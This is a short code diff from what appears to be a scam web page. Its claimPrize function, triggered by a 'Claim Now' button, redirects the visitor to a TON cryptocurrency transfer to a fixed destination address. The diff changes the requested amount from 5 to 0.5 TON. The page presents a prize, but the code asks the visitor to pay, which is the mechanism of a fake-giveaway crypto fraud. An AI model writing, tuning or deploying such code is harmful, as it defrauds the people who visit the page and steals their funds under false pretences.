@@ -301,7 +301,7 @@
 
         // Function when "Claim Now" button is clicked
         function claimPrize() {
-            let amount = 5 * (10 ** 9);
+            let amount = 0.5 * (10 ** 9);
             let transaction_link = `ton://transfer/${DESTINATION_ADDRESS}?amount=${Number(amount)}`;
             
             window.location.href = transaction_link;
